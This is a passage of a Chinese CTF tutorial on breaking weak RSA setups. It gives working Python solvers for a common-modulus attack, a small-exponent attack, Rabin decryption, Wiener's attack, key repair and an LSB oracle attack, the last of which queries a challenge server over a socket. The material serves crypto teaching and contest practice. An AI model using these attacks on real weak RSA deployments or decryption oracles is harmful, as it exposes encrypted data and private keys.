class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_py</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># decode encryption.encrypted</span></span><br><span class="line">    s1 = <span class="string">'abdefghijklmpqrtuvwxyz'</span></span><br><span class="line">    s2 = <span class="string">'dmenwfoxgpyhirasbktclu'</span></span><br><span class="line">    f1 = open(<span class="string">'encryption.encrypted'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'encryption.py'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f1.readlines():</span><br><span class="line">            tmp = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                tmp += s2[s1.index(j)] <span class="keyword">if</span> j <span class="keyword">in</span> s1 <span class="keyword">else</span> j</span><br><span class="line">            f2.write(tmp)</span><br><span class="line"><span class="comment"># fix_py()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    m %= n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[n2, n3] = map(<span class="keyword">lambda</span> x: int(base64.b64decode(x).encode(<span class="string">'hex'</span>), <span class="number">16</span>),</span><br><span class="line">               open(<span class="string">'n2&amp;n3'</span>).readlines())</span><br><span class="line">[n1c1, n1c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'n1.encrypted'</span>).readlines())</span><br><span class="line">[msg1c1, msg2c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'ciphertext'</span>).readlines())</span><br><span class="line"><span class="comment"># 通过共模攻击得到n1</span></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">n1 = common_modulus(n3, e1, e2, n1c1, n1c2)</span><br><span class="line"><span class="comment"># n1,n2有一个共有质因数p1</span></span><br><span class="line"><span class="comment"># n1 += n3  # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。</span></span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line"><span class="keyword">assert</span> (p1 != <span class="number">1</span>)</span><br><span class="line">p2 = n1 / p1</span><br><span class="line">p3 = n2 / p1</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))</span><br><span class="line">msg1 = pow(msg1c1, d1, n1)</span><br><span class="line">msg2 = pow(msg2c2, d2, n2)</span><br><span class="line">msg1 = hex(msg1)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">msg2 = hex(msg2)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> msg1, msg2</span><br><span class="line"><span class="comment"># XA&#123;RP0I_0Itrsigi s.y</span></span><br><span class="line"><span class="comment"># MNCYT_55_neetnvmrap&#125;</span></span><br><span class="line"><span class="comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span></span><br></pre></td></tr></table></figure><h2 id="小明文攻击"><a href="#小明文攻击" class="headerlink" title="小明文攻击"></a>小明文攻击</h2><p><strong>适用情况：e较小，一般为3。</strong> </p><p>公钥e很小，明文m也不大的话，于是<code>m^e=k*n+m</code> 中的的k值很小甚至为0，爆破k或直接开三次方即可。</p><p>Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_msg</span><span class="params">(e, n, c)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> time.asctime(), <span class="string">"Let's waiting..."</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">200000000</span>):</span><br><span class="line">        <span class="keyword">if</span> gmpy2.iroot(c + n * k, e)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> time.asctime(), <span class="string">"...done!"</span></span><br><span class="line">            <span class="keyword">return</span> gmpy2.iroot(c + n * k, <span class="number">3</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="例子：Extremely-hard-RSA"><a href="#例子：Extremely-hard-RSA" class="headerlink" title="例子：Extremely hard RSA"></a>例子：Extremely hard RSA</h3><p>题目提供的n是4096位的，e=3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii,libnum,time</span><br><span class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">res=<span class="number">0</span></span><br><span class="line">c=int(open(<span class="string">'extremelyhardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000000</span>):</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">res=gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> i,res</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(res)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Rabin加密中的N可被分解"><a href="#Rabin加密中的N可被分解" class="headerlink" title="Rabin加密中的N可被分解"></a>Rabin加密中的N可被分解</h2><p><strong>适用情况：e==2</strong> </p><p>Rabin加密是RSA的衍生算法，e==2是Rabin加密典型特征，可以百度或阅读  <a href="https://en.wikipedia.org/wiki/Rabin_cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rabin_cryptosystem</a>  以了解到详细的说明，这里只关注解密方法。一般先通过其他方法分解得到p，q，然后解密。</p><p>Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br></pre></td></tr></table></figure><p>函数返回四个数，这其中只有一个是我们想要的明文，需要通过其他方式验证，当然CTF中显然就是flag字眼了。</p><p>解密方法是参照维基百科的，截图如下：</p><p><img src="1531634016545.png" alt="Wiener&#39;s Attack"></p><h3 id="例子：Jarvis-OJ-hard-RSA"><a href="#例子：Jarvis-OJ-hard-RSA" class="headerlink" title="例子：Jarvis OJ hard RSA"></a>例子：Jarvis OJ hard RSA</h3><p>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,libnum</span><br><span class="line">n=<span class="number">0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">e=<span class="number">2</span></span><br><span class="line">c=int(open(<span class="string">'hardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">mp=pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">mq=pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">yp=gmpy2.invert(p,q)</span><br><span class="line">yq=gmpy2.invert(q,p)</span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n</span><br><span class="line">rr=n-r</span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n</span><br><span class="line">ss=n-s</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(r)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(rr)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(s)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(ss)</span><br></pre></td></tr></table></figure><h2 id="Wiener’s-Attack"><a href="#Wiener’s-Attack" class="headerlink" title="Wiener’s Attack"></a>Wiener’s Attack</h2><p> <strong>适用情况：e过大或过小。</strong> </p><p>工具：<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a>  </p><p>在e过大或过小的情况下，可使用算法从e中快速推断出d的值。详细的算法原理可以阅读：<a href="https://www.tr0y.wang/2017/11/06/CTFRSA/index.html#%E4%BD%8E%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">低解密指数攻击</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="例子：2018强网杯nextrsa-Level2"><a href="#例子：2018强网杯nextrsa-Level2" class="headerlink" title="例子：2018强网杯nextrsa-Level2"></a>例子：2018强网杯nextrsa-Level2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1L</span></span><br><span class="line">e = <span class="number">0x6f6b385dd0f06043c20a7d8e5920802265e1baab9d692e7c20b69391cc5635dbcaae59726ec5882f168b3a292bd52c976533d3ad498b7f561c3dc01a76597e47cfe60614f247551b3dbe200e2196eaa001a1d183886eeacddfe82d80b38aea24de1a337177683ed802942827ce4d28e20efef92f38f1b1a18c66f9b45f5148cceabfd736de8ac4a49e63a8d35a83b664f9f3b00f822b6f11ff13257ee6e0c00ca5c98e661ea594a9e66f2bd56b33d9a13f5c997e67a37fcf9a0c7f04d119fe1ba261127357e64a4b069aefed3049c1c1fe4f964fd078b88bedd064abea385cfebd65e563f93c12d34eb6426e8aa321033cfd8fe8855b9e74d07fe4f9d70de46fL</span></span><br><span class="line">d = wiener_hack(e, n)</span><br><span class="line"><span class="keyword">print</span> d  <span class="comment">#42043</span></span><br></pre></td></tr></table></figure><h2 id="私钥文件修复"><a href="#私钥文件修复" class="headerlink" title="私钥文件修复"></a>私钥文件修复</h2><p><strong>适用情况：提供破损的私钥文件。</strong> </p><h3 id="例子：Jarvis-OJ-God-Like-RSA"><a href="#例子：Jarvis-OJ-God-Like-RSA" class="headerlink" title="例子：Jarvis OJ-God Like RSA"></a>例子：Jarvis OJ-God Like RSA</h3><p>参考 <a href="https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html" target="_blank" rel="noopener">https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html</a> 修复存储私钥的文件，得到p和q。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii,libnum,time</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'godlikeRSA.rar/pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    n = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">p = <span class="number">30061432003658510087798871614869318011389940352798147030129806359975911392091235344042288409629143229311060231549478211871643725394470760528211801310601767727834886942210718412087541234398453046895030858579989874035849439867334906873642352112428914855967993998732685221108379784833027771293275558876952608462050146340591449046825135890871650866799299533696175818103240024841274114925018619060818213433528894936128306780366785977567327073724428211445259983614467640785163297734447975723664659822673456683284394386723716344090232882990461174301609971805075768328757325956784604364401827152431260896927633163074694121679</span></span><br><span class="line">q = <span class="number">26136662545551829820746942051638228325025130519175536694008242208616774469870765684858288042819063837180243501117310278632509413217676559484513481677689042623348188876598901642459170232360966754692434316796014314498263800234390539118817050074978421973817764644287745302885861277447227180288605200894138168586207384484170481511828680117688324729381172912436910052489279406590356734739774635376711681212908417321705094537960645308009611045658947359297373154395500467689532455017647450616447445444254910371922944620114234547655209970657063715028350418518417105772707885648587233103869340985670430269862943630137067052883</span></span><br><span class="line"><span class="keyword">print</span> n==p*q</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">print</span> e*d%phi</span><br><span class="line">c=int(open(<span class="string">'godlikeRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="comment"># 1370223550024951160390505387130177939237950112048472397389773634788136940247048803373180904499220116137720016277614401463947529601059601275191225565163007356175594695217230371190488219356030961008234353281422568670237109241798409859772276203338663213736672988507101836099731545753186306605979236795416523018072994981230167509019379957053839561135207769133885837247551721998502691458955042383536845772871317832519566606644011038158531192089650858814552702073939336587081668849526410118259284356539710136294431275218448114094635426857980426460905608258535404240097392254948848433684475139365021846569436926295331904560877283857331146381104141185386272078892946248648795223866902960499271054375730866146508724739787771837579817109380817612386428775429383894697178101165350212843220568133053034913426083965937819287414427916848075303046293039426388342757953620799736182799948741710617974079729792088434776370340095313622264898772452440870247810948774919910578850614282925852564445288646487485017449052934955175051072066751519784123645584671119185023928739438748519535869994754998423784897445884244844154563303115861175492133906368196005147361767160830004522010287149025190543608485818909441439294996482797249312140402141744752129890112</span></span><br><span class="line"><span class="comment"># 明文是这个，flag是啥不知道</span></span><br></pre></td></tr></table></figure><h2 id="LSB-Oracle-Attack"><a href="#LSB-Oracle-Attack" class="headerlink" title="LSB Oracle Attack"></a>LSB Oracle Attack</h2><p><strong>适用情况：可以选择密文并泄露最低位。</strong> </p><p>在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出<code>c&#39;=((2^e)*c)%n=((2^e)*(m^e))%n=((2*m)^e)%n</code> ， 因为m的两倍可能大于n，所以经过解密得到的明文是 <code>m&#39;=(2*m)%n</code> 。我们还能够知道 <code>m&#39;</code> 的最低位<code>lsb</code> 是1还是0。 因为n是奇数，而<code>2*m</code> 是偶数，所以如果<code>lsb</code> 是0，说明<code>(2*m)%n</code> 是偶数，没有超过n，即<code>m&lt;n/2.0</code> ，反之则<code>m&gt;n/2.0</code> 。举个例子就能明白<code>2%3=2</code> 是偶数，而<code>4%3=1</code> 是奇数。以此类推，构造密文<code>c&quot;=(4^e)*c)%n</code> 使其解密后为<code>m&quot;=(4*m)%n</code>   ，判断<code>m&quot;</code> 的奇偶性可以知道<code>m</code> 和 <code>n/4</code> 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间。</p><p>更多信息可参考：<a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">RSA Least-Significant-Bit Oracle Attack</a>  和 <a href="https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack" target="_blank" rel="noopener">RSA least significant bit oracle attack</a> 。</p><p>Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lsb == <span class="string">'odd'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># for 'precise enough' floats</span></span><br><span class="line">    lo = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    hi = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            hi = (lo + hi) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = (lo + hi) / <span class="number">2</span></span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="comment"># print i, int(hi - lo)</span></span><br><span class="line">    <span class="keyword">return</span> int(hi)</span><br></pre></td></tr></table></figure><h3 id="例子：QCTF2018-XMan选拔赛-Baby-RSA"><a href="#例子：QCTF2018-XMan选拔赛-Baby-RSA" class="headerlink" title="例子：QCTF2018-XMan选拔赛/Baby RSA"></a>例子：QCTF2018-XMan选拔赛/Baby RSA</h3><p>题目如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line"></span><br><span class="line">λ nc <span class="number">47.96</span><span class="number">.239</span><span class="number">.28</span> <span class="number">23333</span></span><br><span class="line">----------------------------- baby rsa -----------------------------</span><br><span class="line">Come <span class="keyword">and</span> Decode your data</span><br><span class="line">If you give me ciphertext, I can tell you whether decoded data <span class="keyword">is</span> even <span class="keyword">or</span> odd</span><br><span class="line">You can input ciphertext(hexdecimal) now</span><br><span class="line"><span class="number">1</span></span><br><span class="line">odd</span><br></pre></td></tr></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="comment"># ref:</span></span><br><span class="line"><span class="comment"># https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack</span></span><br><span class="line"><span class="comment"># https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/</span></span><br><span class="line"><span class="comment"># https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</span></span><br><span class="line"><span class="keyword">import</span> libnum, gmpy2, socket, time, decimal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c1)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    hostname = <span class="string">'47.96.239.28'</span></span><br><span class="line">    port = <span class="number">23333</span></span><br><span class="line">    s.connect((hostname, port))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(hex(c1)[<span class="number">2</span>:].strip(<span class="string">"lL"</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    res = s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'even'</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'odd'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span 